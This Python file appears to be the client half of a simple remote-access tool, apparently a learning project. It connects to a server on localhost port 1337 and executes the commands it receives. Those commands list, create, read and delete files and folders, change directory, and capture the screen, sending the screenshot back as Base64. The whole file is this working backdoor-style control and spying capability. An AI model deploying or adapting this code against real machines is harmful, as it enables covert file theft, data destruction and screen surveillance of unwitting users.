import socket
import time
import os
import pyautogui
import io
import base64
from PIL import Image
from colorama import Fore, Style, init

init(autoreset=True)

IPSERVEUR = 'localhost'
PORT = 1337

client = socket.socket()
client.connect((IPSERVEUR, PORT))
print(f"Connexion vers {IPSERVEUR} : " + str(PORT) + " réussie.")


def sendResponse(msg):
    msg = str(msg)
    msg = msg.encode('utf-8')
    n = client.send(msg)
    if n != len(msg):
        print('Error while sending.')
    return


def list_files_and_folders(path="."):
    entries = []
    for name in os.listdir(path):
        if os.path.isdir(os.path.join(path, name)):
            entries.append(Fore.BLUE + Style.BRIGHT + name + "/" + Style.RESET_ALL)
        else:
            entries.append(Fore.WHITE + name + Style.RESET_ALL)
    entries.sort()
    max_len = max(len(entry) for entry in entries)
    entries = [entry.ljust(max_len) for entry in entries]

    result = []
    for i in range(0, len(entries), 2):
        line = entries[i]
        if i + 1 < len(entries):
            line += "\t" + entries[i + 1]
        result.append(line)

    return "\n".join(result)


while True:
    data = client.recv(1024)
    data = data.decode('utf-8')
    arr_data = data.split()
    if not data:
        print('Error while recieve')
        break
    else:
        match arr_data[0]:

            case 'close':  # Close the connection
                client.close()
                sendResponse("Client died")
                break

            case 'mkdir':  # Create a directory
                if len(arr_data) < 2:
                    sendResponse("Insufficient data")
                name = arr_data[1]
                if len(arr_data) >= 3:
                    try:
                        nbr = int(arr_data[2])
                    except ValueError:
                        sendResponse("Invalid number")
                else:
                    nbr = 1
                if nbr == 1 or nbr is None:
                    try:
                        os.mkdir(name)
                    except FileExistsError:
                        print('File already exists.')
                else:
                    for i in range(nbr):
                        try:
                            os.mkdir(name + str(i))
                        except FileExistsError:
                            print('File already exists.')
                sendResponse("Ok")

            case 'touch':  # Create a file
                if len(arr_data) < 2:
                    sendResponse("Insufficient data")
                name = arr_data[1]
                if len(arr_data) >= 3:
                    try:
                        nbr = int(arr_data[2])
                    except ValueError:
                        sendResponse("Invalid number")
                else:
                    nbr = 1
                if nbr == 1 or nbr is None:
                    try:
                        open(name, 'x')
                    except FileExistsError:
                        print('File already exists.')
                else:
                    for i in range(nbr):
                        try:
                            open(name + str(i), 'x')
                        except FileExistsError:
                            print('File already exists.')
                sendResponse("Ok")

            case 'ls':  # List all the directories
                result = list_files_and_folders()
                sendResponse(result)

            case 'rm':  # Remove a file
                if len(arr_data) < 2:
                    sendResponse("Insufficient data")
                name = arr_data[1]
                try:
                    os.remove(name)
                except FileNotFoundError:
                    sendResponse("File not found")
                else:
                    sendResponse("Ok")

            case 'rmdir':  # Remove a directory
                if len(arr_data) < 2:
                    sendResponse("Insufficient data")
                name = arr_data[1]
                try:
                    os.rmdir(name)
                except FileNotFoundError:
                    sendResponse("File not found")
                else:
                    sendResponse("Ok")

                    

            case 'cd':  # Change directory
                dir = arr_data[1]
                os.chdir(dir)
                sendResponse(f"Directory changed to -> {dir}")
            
            case 'pwd':  # Display the current directory
                sendResponse(os.getcwd())
                
            case 'cat':  # Display the file content
                name = arr_data[1]
                try:
                    f = open(name, 'r')
                except FileNotFoundError:
                    sendResponse("File not found")
                else:
                    msg = f.read()
                    sendResponse(msg)
                    f.close()

            case 'screen':  # Take screenshots
                # Take a screenshot
                screenshot = pyautogui.screenshot()

                # Create a buffer in memory to store the image data
                ibi = io.BytesIO()

                # Save the image in the buffer in memory as PNG format
                screenshot.save(ibi, format='PNG')

                # Get the image datas as bytes
                image_bytes = ibi.getvalue()

                # Convert the bytes in Base64 String
                image_string = base64.b64encode(image_bytes).decode()
                sendResponse(image_string)

            case _:  # Default case
                pass  # Ignore the instruction
                sendResponse("Cmd ignored")

    time.sleep(0.1)

print('Déconnexion.')
client.close()
